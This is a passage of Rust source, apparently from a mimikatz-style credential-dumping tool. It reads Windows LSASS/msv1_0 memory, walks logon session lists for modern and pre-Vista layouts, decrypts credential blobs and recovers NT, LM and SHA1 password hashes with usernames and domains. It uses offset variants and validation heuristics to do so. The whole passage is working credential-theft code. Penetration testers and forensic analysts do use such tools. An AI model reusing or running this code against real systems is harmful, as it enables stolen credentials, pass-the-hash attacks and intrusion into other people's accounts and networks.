        if decrypted.len() < sha1_off + 20 {
            continue;
        }

        let mut nt_hash = [0u8; 16];
        let mut lm_hash = [0u8; 16];
        let mut sha1_hash = [0u8; 20];
        nt_hash.copy_from_slice(&decrypted[nt_off..nt_off + 16]);
        lm_hash.copy_from_slice(&decrypted[lm_off..lm_off + 16]);
        sha1_hash.copy_from_slice(&decrypted[sha1_off..sha1_off + 20]);

        // NT hash must be non-zero
        if nt_hash == [0u8; 16] {
            continue;
        }

        // Cross-validate: SHA1(NT) should match sha1_hash (strongest validation)
        if sha1_digest(&nt_hash) == sha1_hash {
            log::info!(
                "  Using primary cred offset variant {} (nt=0x{:x}, lm=0x{:x}, sha1=0x{:x}) [SHA1 validated]",
                vi, offsets.nt_hash, offsets.lm_hash, offsets.sha1_hash
            );
            *validated_variant = Some(vi);
            best_result = Some(RawPrimaryCred {
                lm_hash,
                nt_hash,
                sha1_hash,
            });
            break;
        }

        // SHA1 field doesn't match — collect as entropy candidate if NT looks hash-like.
        // Reject if LM == NT (both non-zero): impossible for real creds (different algorithms).
        if lm_hash != [0u8; 16] && lm_hash == nt_hash {
            continue;
        }
        if looks_like_hash(&nt_hash) {
            // Score structural plausibility of this variant by checking boolean flag area
            let struct_score = structural_score(&decrypted, offsets);
            log::info!(
                "  Candidate primary cred offset variant {} (nt=0x{:x}) [entropy ok, SHA1 mismatch, struct_score={}]",
                vi, offsets.nt_hash, struct_score
            );
            // Use SHA1 from blob (ShaOwPassword). For human accounts this is
            // SHA1(UTF16LE(password)), not SHA1(NT_hash). Only compute SHA1(NT)
            // as fallback if the blob's sha1 field is zeroed.
            let final_sha1 = if sha1_hash == [0u8; 20] {
                sha1_digest(&nt_hash)
            } else {
                sha1_hash
            };
            entropy_candidates.push((
                vi,
                struct_score,
                RawPrimaryCred {
                    lm_hash,
                    nt_hash,
                    sha1_hash: final_sha1,
                },
            ));
        }
    }

    // DPAPI cross-check: when isDPAPIProtected=1, the 16 bytes at DPAPI_PROTECTED_HASH_OFF
    // are the DPAPI Protected hash, NOT the NT hash. Reject any entropy candidate whose
    // NT hash matches that field — it's reading the wrong data.
    //
    // MSV1_0_PRIMARY_CREDENTIAL boolean flags layout (Win10+):
    //   +0x28..+0x2D: 5 boolean flags (isNtOwfPassword, isLmOwfPassword, isShaOwPassword,
    //                 isDPAPIProtected, isIso) — each 0 or 1 in valid decryptions
    const FLAGS_START: usize = 0x28;
    const FLAGS_END: usize = 0x2D;
    const DPAPI_PROTECTED_FLAG: usize = 0x2C;
    const DPAPI_PROTECTED_HASH_OFF: usize = 0x6A;
    const DPAPI_PROTECTED_HASH_END: usize = 0x7A;

    if best_result.is_none() && !entropy_candidates.is_empty() && decrypted.len() >= DPAPI_PROTECTED_HASH_END {
        let flags_look_valid = decrypted.len() >= FLAGS_END
            && decrypted[FLAGS_START..FLAGS_END].iter().all(|&b| b <= 1);
        let is_dpapi_protected = flags_look_valid && decrypted[DPAPI_PROTECTED_FLAG] == 1;

        if is_dpapi_protected {
            let dpapi_field = &decrypted[DPAPI_PROTECTED_HASH_OFF..DPAPI_PROTECTED_HASH_END];
            let before = entropy_candidates.len();
            entropy_candidates.retain(|(vi, _, cred)| {
                if cred.nt_hash[..] == dpapi_field[..] {
                    log::info!(
                        "  Rejecting variant {} (nt=0x{:x}): NT hash matches DPAPIProtected field at 0x6A",
                        vi,
                        PRIMARY_CRED_OFFSET_VARIANTS[*vi].nt_hash
                    );
                    false
                } else {
                    true
                }
            });
            if entropy_candidates.len() < before {
                log::info!(
                    "  DPAPI cross-check: rejected {} candidates (isDPAPIProtected=1)",
                    before - entropy_candidates.len()
                );
            }
        }
    }

    // Use SHA1-validated result, or best entropy-based result.
    // Among entropy candidates, prefer those with higher structural scores (boolean flag validation).
    if best_result.is_none() && !entropy_candidates.is_empty() {
        // Reject candidates with struct_score=0: the boolean flags at 0x28..0x2D
        // (Win10+) must all be 0 or 1 in a real decrypted credential blob. Random/garbage
        // data almost never passes this check (p ≈ (2/256)^5 ≈ 3e-11).
        let before = entropy_candidates.len();
        entropy_candidates.retain(|&(_, score, _)| score > 0);
        if entropy_candidates.len() < before {
            log::info!(
                "  Structural filter: rejected {} candidates with struct_score=0",
                before - entropy_candidates.len()
            );
        }

        if !entropy_candidates.is_empty() {
            // Sort by struct_score descending, then by variant index ascending (canonical first)
            entropy_candidates.sort_by(|a, b| b.1.cmp(&a.1).then(a.0.cmp(&b.0)));
            let (vi, score, _) = &entropy_candidates[0];
            log::info!(
                "  Using primary cred offset variant {} [entropy-based, SHA1 computed, struct_score={}]",
                vi, score
            );
            // Also remember this variant for future credentials (less confident than SHA1)
            if *score >= 10 {
                *validated_variant = Some(*vi);
            }
            best_result = Some(entropy_candidates.swap_remove(0).2);
        }
    }

    best_result.ok_or_else(|| {
        crate::error::VmkatzError::DecryptionError(
            "No offset variant matched (SHA1 cross-validation and entropy check both failed)"
                .to_string(),
        )
    })
}

/// Score structural plausibility of a PRIMARY_CREDENTIAL offset variant.
/// Checks boolean flag area, DPAPI layout detection, and LM-zero heuristic.
/// Higher score = more structurally plausible.
///
/// Key insight: Win10 1607+ with isDPAPIProtected stores a 20-byte SHA/DPAPI
/// field at +0x36 BEFORE the actual hashes, shifting NT to +0x4A.
/// Detected by: data at 0x36 matching first 16B of data at 0x6A.
///
/// Boolean flag layout in MSV1_0_PRIMARY_CREDENTIAL (Win10 1607+):
///   +0x28: isIso           (BOOLEAN) — Credential Guard isolation flag
///   +0x29: isNtOwfPassword (BOOLEAN) — NT hash is present
///   +0x2A: isLmOwfPassword (BOOLEAN) — LM hash is present
///   +0x2B: isShaOwPassword (BOOLEAN) — SHA1 hash is present
///   +0x2C: isDPAPIProtected (BOOLEAN) — DPAPI-shifted layout active
/// For Win10 1507/1511, flags start at +0x20 with the same relative order:
///   +0x20: isIso, +0x21: isNtOwfPassword, +0x22: isLmOwfPassword, +0x23: isShaOwPassword
fn structural_score(blob: &[u8], offsets: &PrimaryCredOffsets) -> u32 {
    let nt_off = offsets.nt_hash;
    let lm_off = offsets.lm_hash;
    let mut score = 0u32;

    // Check if this blob has the DPAPI-shifted layout (NT at 0x4A instead of 0x36).
    // When isDPAPIProtected=1, a 20B SHA/DPAPI value appears at 0x36, duplicating
    // the value at 0x6A. When isDPAPIProtected=0, 0x36 is all zeros but NT is
    // still at 0x4A. In both cases, the canonical 0x36 offset reads SHA/DPAPI data
    // or zeros — NOT the real NT hash.
    let dpapi_shifted = if blob.len() >= 0x7E {
        let at_36 = &blob[0x36..0x4A]; // 20 bytes
        let at_6a = &blob[0x6A..0x7E]; // 20 bytes
                                       // DPAPI layout: data at 0x36 matches data at 0x6A (both non-zero),
                                       // OR 0x36 is all zeros AND 0x6A is non-zero (isDPAPIProtected=0 variant)
        let both_match = at_36 == at_6a && at_36 != [0u8; 20];
        let zeros_at_36 = at_36 == [0u8; 20] && at_6a != [0u8; 20];
        both_match || zeros_at_36
    } else {
        false
    };

    match nt_off {
        // Win10 1607+ canonical (NT at 0x36) — ONLY valid when NOT DPAPI-shifted
        0x36 if blob.len() >= 0x36 => {
            if dpapi_shifted {
                // Data at 0x36 is SHA/DPAPI material, NOT the NT hash → invalidate
                return 0;
            }
            let flags = &blob[0x28..0x2D]; // isIso..isDPAPIProtected
            let all_bool = flags.iter().all(|&b| b <= 1);
            if all_bool {
                score += 10;
                if blob[0x29] == 1 { // isNtOwfPassword == true
                    score += 5;
                }
            }
        }
        // Win10 1507/1511
        0x28 if blob.len() >= 0x28 => {
            let flags = &blob[0x20..0x24]; // isIso..isShaOwPassword
            let all_bool = flags.iter().all(|&b| b <= 1);
            if all_bool {
                score += 10;
                if blob[0x21] == 1 { // isNtOwfPassword == true
                    score += 5;
                }
            }
        }
        // Win7/Win8: no flags before hashes
        0x20 if blob.len() >= 0x20 => {
            score += 3;
        }
        // Win10 1607+ without unk0/unk1
        0x30 if blob.len() >= 0x30 => {
            if dpapi_shifted {
                return 0;
            } // Same DPAPI issue
            let flags = &blob[0x28..0x2D]; // isIso..isDPAPIProtected
            let all_bool = flags.iter().all(|&b| b <= 1);
            if all_bool {
                score += 8;
                if blob[0x29] == 1 { // isNtOwfPassword == true
                    score += 3;
                }
            }
        }
        // Win10 1607+ DPAPI-shifted layout (NT at 0x4A)
        0x4A => {
            if dpapi_shifted {
                // DPAPI layout confirmed: validate flags and boost score
                if blob.len() >= 0x2D {
                    let flags = &blob[0x28..0x2D]; // isIso..isDPAPIProtected
                    let all_bool = flags.iter().all(|&b| b <= 1);
                    if all_bool {
                        score += 15; // Strong structural match
                        if blob[0x29] == 1 { // isNtOwfPassword == true
                            score += 5;
                        }
                    }
                }
            }
            // Also check: LM at 0x5A should be all zeros on modern Windows
            if blob.len() >= lm_off + 16 {
                let lm = &blob[lm_off..lm_off + 16];
                if lm == [0u8; 16] {
                    score += 3;
                }
            }
        }
        _ => {}
    }

    score
}

/// Check if 16 bytes look like a hash rather than UTF-16 text or structured data.
/// UTF-16 text has 0x00 at every other byte (for ASCII chars in UTF-16LE).
/// Structured data with boolean flags has patterns like 01 01 01 00.
fn looks_like_hash(data: &[u8; 16]) -> bool {
    // Count zero bytes — UTF-16LE ASCII has ~50% zero bytes
    let zero_count = data.iter().filter(|&&b| b == 0).count();
    if zero_count >= 6 {
        return false; // Too many zeros for a hash — likely UTF-16 text
    }
    // Check for alternating zero pattern (UTF-16LE): xx 00 xx 00
    let utf16_pattern = data
        .chunks(2)
        .filter(|c| c.len() == 2 && c[1] == 0 && c[0] != 0)
        .count();
    if utf16_pattern >= 5 {
        return false; // Strongly resembles UTF-16LE text
    }
    // Reject repeating byte patterns (decryption artifacts from garbage/paged data).
    // Real MD4 hashes essentially never have an 8-byte cycle (p ≈ 2^-64).
    if is_repeating_pattern(data) {
        return false;
    }
    true
}

/// Public wrapper for cross-module use (kerberos.rs).
pub fn is_repeating_pattern_pub(data: &[u8]) -> bool {
    is_repeating_pattern(data)
}

/// Detect repeating byte patterns with cycle lengths 1, 2, 4, or 8.
/// Garbage decryption often produces short repeating cycles
/// (e.g., `65a09c76aa8aa167` repeated to fill the field).
fn is_repeating_pattern(data: &[u8]) -> bool {
    for cycle_len in [1, 2, 4, 8] {
        if data.len() >= cycle_len * 2 {
            let pattern = &data[..cycle_len];
            if data.chunks(cycle_len).all(|c| c == pattern) {
                return true;
            }
        }
    }
    false
}

/// Minimal inline SHA-1 for cross-validating NT hash against SHA1 field.
/// Avoids external crate dependency.
use crate::utils::sha1_digest;

// ---------------------------------------------------------------------------
// Pre-Vista MSV credential extraction (WinXP, Win2003)
// ---------------------------------------------------------------------------

/// Pre-Vista MSV1_0 list entry offsets (32-bit structures).
struct PreVistaMsvOffsets {
    flink: u64,
    luid: u64,
    username: u64,  // 32-bit UNICODE_STRING
    domain: u64,    // 32-bit UNICODE_STRING
    credentials_ptr: u64,  // 32-bit pointer to primary credential
}

/// Known pre-Vista MSV offset variants.
const PREVISTA_MSV_OFFSETS: &[PreVistaMsvOffsets] = &[
    // NT5 (XP SP3 / Win2003 SP2) from mimikatz KIWI_MSV1_0_LIST_51
    // LUID at +0x08, UserName at +0x10, Domain at +0x18, pCredentials at +0x44
    PreVistaMsvOffsets {
        flink: 0,
        luid: 0x08,
        username: 0x10,
        domain: 0x18,
        credentials_ptr: 0x44,
    },
    // Win2003 R2 SP2 x86 (NTLM credential entries — LUID after "NTLM" signature)
    PreVistaMsvOffsets {
        flink: 0,
        luid: 0x0C,
        username: 0x20,
        domain: 0x28,
        credentials_ptr: 0x1C,
    },
    // WinXP SP3 x86 variant
    PreVistaMsvOffsets {
        flink: 0,
        luid: 0x10,
        username: 0x20,
        domain: 0x30,
        credentials_ptr: 0x50,
    },
];

/// Pre-Vista primary credential layout (simpler than Vista+).
/// After decryption, the blob contains:
///   offset 0x00: LogonDomainName (UNICODE_STRING32 — 8 bytes: len, maxlen, buffer)
///   offset 0x08: UserName (UNICODE_STRING32 — 8 bytes)
///   offset 0x10: NtOwfPassword (16 bytes)
///   offset 0x20: LmOwfPassword (16 bytes)
const PREVISTA_NT_HASH_OFFSET: usize = 0x10;
const PREVISTA_LM_HASH_OFFSET: usize = 0x20;

/// Extract pre-Vista MSV credentials from msv1_0.dll using 32-bit structures.
pub fn extract_prevista_msv_credentials(
    vmem: &dyn VirtualMemory,
    msv_base: u64,
    _msv_size: u64,
    keys: &PreVistaCryptoKeys,
) -> Result<Vec<(u64, MsvCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, msv_base)?;

    let text = pe
        .find_section(".text")
        .ok_or_else(|| VmkatzError::PatternNotFound(".text in msv1_0.dll (pre-Vista)".to_string()))?;

    // Find LogonSessionList head using pattern matching
    let list_addrs = find_prevista_logon_session_list(vmem, &pe, msv_base, text.virtual_address as u64, text.virtual_size)?;

    let mut results = Vec::new();

    for list_addr in &list_addrs {
        for offsets in PREVISTA_MSV_OFFSETS {
            let mut creds = walk_prevista_msv_list(vmem, *list_addr, offsets, keys);
            if !creds.is_empty() {
                results.append(&mut creds);
                // Found working combo, stop trying more list+offset combos
                log::info!(
                    "Pre-Vista MSV: extracted {} credentials from list 0x{:x}",
                    results.len(), list_addr
                );
                return Ok(results);
            }
        }
    }

    // Fallback: scan .data section for list candidates
    if let Some(data_sect) = pe.find_section(".data") {
        let data_base = msv_base + data_sect.virtual_address as u64;
        let data_size = data_sect.virtual_size as usize;
        log::debug!(
            "Pre-Vista MSV .data scan: base=0x{:x} size=0x{:x}",
            data_base, data_size
        );
        let data = vmem.read_virt_bytes(data_base, data_size)?;

        let mut candidate_count = 0u32;
        for off in (0..data.len().saturating_sub(4)).step_by(4) {
            let flink = super::types::read_u32_le(&data, off).unwrap_or(0) as u64;
            if !(0x10000..=0x80000000).contains(&flink) {
                continue;
            }
            let list_addr = data_base + off as u64;
            // Check if it's a valid LIST_ENTRY (flink's blink points back)
            if let Ok(blink) = vmem.read_virt_u32(flink + 4) {
                if blink as u64 != list_addr {
                    continue;
                }
                candidate_count += 1;
                log::debug!(
                    "Pre-Vista MSV: LIST_ENTRY candidate at 0x{:x} -> flink=0x{:x}",
                    list_addr, flink
                );
            } else {
                continue;
            }

            for offsets in PREVISTA_MSV_OFFSETS {
                let mut creds = walk_prevista_msv_list(vmem, list_addr, offsets, keys);
                if !creds.is_empty() {
                    results.append(&mut creds);
                    return Ok(results);
                }
            }
        }
        log::debug!("Pre-Vista MSV: {} LIST_ENTRY candidates tried, none yielded credentials", candidate_count);
    } else {
        log::debug!("Pre-Vista MSV: no .data section in msv1_0.dll");
    }

    if results.is_empty() {
        Err(VmkatzError::PatternNotFound("Pre-Vista LogonSessionList".to_string()))
    } else {
        Ok(results)
    }
}

/// Find LogonSessionList head addresses in pre-Vista msv1_0.dll.
fn find_prevista_logon_session_list(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    msv_base: u64,
    text_rva: u64,
    text_size: u32,
) -> Result<Vec<u64>> {
    let text_base = msv_base + text_rva;
    let mut candidates = Vec::new();

    // Try pattern-based detection
    if let Ok((pattern_addr, _pat_idx)) = patterns::find_pattern(
        vmem,
        text_base,
        text_size,
        patterns::PREVISTA_MSV_LOGON_SESSION_PATTERNS,
        "PreVista-LogonSessionList",
    ) {
        // Scan near pattern for absolute address references
        // In x86 code, list address is usually loaded via: MOV reg, [abs_addr] or LEA reg, [abs_addr]
        let code = vmem.read_virt_bytes(pattern_addr.saturating_sub(0x40), 0x100)?;
        let code_base = pattern_addr.saturating_sub(0x40);

        for i in 0..code.len().saturating_sub(5) {
            // Look for MOV reg, [imm32] patterns: A1 xx xx xx xx (MOV EAX, [abs])
            // or 8B 0D/15/35 xx xx xx xx (MOV ECX/EDX/ESI, [abs])
            let is_mov_abs = code[i] == 0xA1
                || (code[i] == 0x8B && matches!(code.get(i + 1), Some(0x0D | 0x15 | 0x1D | 0x35 | 0x3D)));

            if is_mov_abs {
                let addr_off = if code[i] == 0xA1 { i + 1 } else { i + 2 };
                if addr_off + 4 > code.len() {
                    continue;
                }
                let abs_addr = super::types::read_u32_le(&code, addr_off).unwrap_or(0) as u64;
                // Validate: should be in .data section range
                if let Some(data_sect) = pe.find_section(".data") {
                    let data_start = msv_base + data_sect.virtual_address as u64;
                    let data_end = data_start + data_sect.virtual_size as u64;
                    if abs_addr >= data_start && abs_addr < data_end {
                        // Verify it looks like a LIST_ENTRY head
                        if let Ok(flink) = vmem.read_virt_u32(abs_addr) {
                            let flink64 = flink as u64;
                            if flink64 == abs_addr || (0x10000..0x80000000).contains(&flink64) {
                                candidates.push(abs_addr);
                            }
                        }
                    }
                }
                let _ = code_base;
            }
        }
    }

    if candidates.is_empty() {
        log::debug!("Pre-Vista: no pattern-based LogonSessionList found, using .data scan only");
    }

    Ok(candidates)
}

/// Walk a pre-Vista MSV linked list using 32-bit pointers.
fn walk_prevista_msv_list(
    vmem: &dyn VirtualMemory,
    list_addr: u64,
    offsets: &PreVistaMsvOffsets,
    keys: &PreVistaCryptoKeys,
) -> Vec<(u64, MsvCredential)> {
    let mut results = Vec::new();
    let mut visited = std::collections::HashSet::new();
    visited.insert(list_addr);

    // Read first Flink
    let mut current = match vmem.read_virt_u32(list_addr + offsets.flink) {
        Ok(f) => f as u64,
        Err(_) => return results,
    };

    let max_entries = 100;
    for iter in 0..max_entries {
        if current == list_addr || current == 0 || current < 0x10000 {
            break;
        }
        if visited.contains(&current) {
            break;
        }
        visited.insert(current);

        // Read LUID (still u64 even on 32-bit — LUID is two DWORDs)
        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);

        // Read username and domain using 32-bit UNICODE_STRING
        let username = vmem.read_win_unicode_string_32(current + offsets.username).unwrap_or_default();
        let domain = vmem.read_win_unicode_string_32(current + offsets.domain).unwrap_or_default();

        // Read credentials pointer (32-bit)
        let cred_ptr = match vmem.read_virt_u32(current + offsets.credentials_ptr) {
            Ok(p) => p as u64,
            Err(_) => {
                // Move to next entry
                current = vmem.read_virt_u32(current + offsets.flink).unwrap_or(0) as u64;
                continue;
            }
        };

        log::debug!(
            "Pre-Vista MSV walk[{}]: entry=0x{:x} luid=0x{:x} user='{}' domain='{}' cred_ptr=0x{:x}",
            iter, current, luid, username, domain, cred_ptr
        );

        if cred_ptr >= 0x10000 && !username.is_empty() {
            // Extract primary credential
            if let Some(cred) = extract_prevista_primary_credential(vmem, cred_ptr, keys, &username, &domain) {
                log::info!(
                    "Pre-Vista MSV: LUID=0x{:x} {}\\{} NT={}",
                    luid, domain, username, hex::encode(cred.nt_hash)
                );
                results.push((luid, cred));
            }
        }

        // Move to next entry
        current = vmem.read_virt_u32(current + offsets.flink).unwrap_or(0) as u64;
    }

    results
}

/// Extract and decrypt a pre-Vista primary credential.
fn extract_prevista_primary_credential(
    vmem: &dyn VirtualMemory,
    cred_ptr: u64,
    keys: &PreVistaCryptoKeys,
    username: &str,
    domain: &str,
) -> Option<MsvCredential> {
    // Pre-Vista primary credential structure:
    // At cred_ptr: the encrypted blob pointer and size
    // Layout varies, but typically:
    //   +0x00: UNICODE_STRING Domain (32-bit: 8 bytes)
    //   +0x08: UNICODE_STRING UserName (32-bit: 8 bytes)
    //   +0x10: encrypted NT hash (16 bytes) or encrypted blob pointer
    //
    // Actually, in NT5, the structure at cred_ptr typically contains:
    //   Primary UNICODE_STRING at +0 (identifies "Primary" type)
    //   Then an encrypted blob at a known offset
    //
    // Two approaches:
    // 1. Direct hash reading at cred_ptr + offset (if not encrypted)
    // 2. Encrypted blob with DES-X-CBC/RC4 decryption

    // Try approach 1: read encrypted blob pointer
    // Pre-Vista stores encrypted credentials at cred_ptr+0x10 (size) and cred_ptr+0x14 (ptr)
    let enc_size = vmem.read_virt_u32(cred_ptr + 0x10).ok()? as usize;
    let enc_ptr = vmem.read_virt_u32(cred_ptr + 0x14).ok()? as u64;

    if enc_size == 0 || enc_size > 0x1000 || enc_ptr < 0x10000 {
        // Try alternative layout: size at +0x18, ptr at +0x1C
        let enc_size2 = vmem.read_virt_u32(cred_ptr + 0x18).ok()? as usize;
        let enc_ptr2 = vmem.read_virt_u32(cred_ptr + 0x1C).ok()? as u64;

        if enc_size2 > 0 && enc_size2 <= 0x1000 && enc_ptr2 >= 0x10000 {
            return decrypt_and_extract_prevista_hashes(vmem, enc_ptr2, enc_size2, keys, username, domain);
        }

        // Try approach 2: the entire struct at cred_ptr is the encrypted blob
        // Some NT5 variants embed the encrypted data inline
        if enc_size > 0 && enc_size <= 0x200 {
            let inline_data = vmem.read_virt_bytes(cred_ptr, enc_size).ok()?;
            if let Ok(decrypted) = crate::lsass::crypto::decrypt_credential_prevista(keys, &inline_data) {
                return extract_hashes_from_prevista_blob(&decrypted, username, domain);
            }
        }

        return None;
    }

    decrypt_and_extract_prevista_hashes(vmem, enc_ptr, enc_size, keys, username, domain)
}

/// Decrypt an encrypted pre-Vista credential blob and extract NT/LM hashes.
fn decrypt_and_extract_prevista_hashes(
    vmem: &dyn VirtualMemory,
    enc_ptr: u64,
    enc_size: usize,
    keys: &PreVistaCryptoKeys,
    username: &str,
    domain: &str,
) -> Option<MsvCredential> {
    let encrypted = vmem.read_virt_bytes(enc_ptr, enc_size).ok()?;
    let decrypted = crate::lsass::crypto::decrypt_credential_prevista(keys, &encrypted).ok()?;
    extract_hashes_from_prevista_blob(&decrypted, username, domain)
}

/// Extract NT/LM hashes from a decrypted pre-Vista credential blob.
fn extract_hashes_from_prevista_blob(
    decrypted: &[u8],
    username: &str,
    domain: &str,
) -> Option<MsvCredential> {
    // Need at least 0x30 bytes (NT hash at 0x10 + LM hash at 0x20)
    if decrypted.len() < 0x30 {
        return None;
    }

    let nt_hash: [u8; 16] = decrypted[PREVISTA_NT_HASH_OFFSET..PREVISTA_NT_HASH_OFFSET + 16]
        .try_into()
        .ok()?;
    let lm_hash: [u8; 16] = decrypted[PREVISTA_LM_HASH_OFFSET..PREVISTA_LM_HASH_OFFSET + 16]
        .try_into()
        .ok()?;

    // Validate: NT hash should not be all zeros (unless it's a blank password)
    // At minimum, check that we have something non-trivial
    if nt_hash == [0u8; 16] && lm_hash == [0u8; 16] {
        return None;
    }

    Some(MsvCredential {
        username: username.to_string(),
        domain: domain.to_string(),
        nt_hash,
        lm_hash,
        sha1_hash: [0u8; 20], // Pre-Vista doesn't store SHA1
    })
}

// -- x86-aware variants --

/// x86 MSV offset variants.
/// On x86, pointers are 4 bytes and UNICODE_STRINGs are 8 bytes, shifting all fields.
const MSV_OFFSET_VARIANTS_X86: &[MsvOffsets] = &[
    // Variant 0: NlpActiveLogon x86 (Win10 19041+)
    // Flink(4)+Blink(4)+refs(8)+LUID(8) = LUID at +0x10
    // username at +0x20 (x86 UNICODE_STRING=8B), domain at +0x28
    MsvOffsets {
        flink: 0x00,
        luid: 0x18,
        username: 0x28,
        domain: 0x30,
        credentials_ptr: 0,
        logon_type: 0x20,
        session_id: 0x24,
        logon_time: 0,
        logon_server: 0x38,
        sid: 0x48,
        sid_embedded: true,
    },
    // Variant 1: KIWI_MSV1_0_LIST_63 x86 (Win10 10240-22H2)
    // LIST_ENTRY(8)+unk0-5(6*4=24)+pad+LUID = LUID at ~0x3C
    MsvOffsets {
        flink: 0x00,
        luid: 0x3C,
        username: 0x4C,
        domain: 0x54,
        credentials_ptr: 0x84,
        logon_type: 0x70,
        session_id: 0x78,
        logon_time: 0x7C,
        logon_server: 0x5C,
        sid: 0x68,
        sid_embedded: false,
    },
    // Variant 2: LIST_62 x86 (Win8)
    MsvOffsets {
        flink: 0x00,
        luid: 0x3C,
        username: 0x44,
        domain: 0x4C,
        credentials_ptr: 0x7C,
        logon_type: 0x68,
        session_id: 0x70,
        logon_time: 0x74,
        logon_server: 0x54,
        sid: 0x60,
        sid_embedded: false,
    },
];

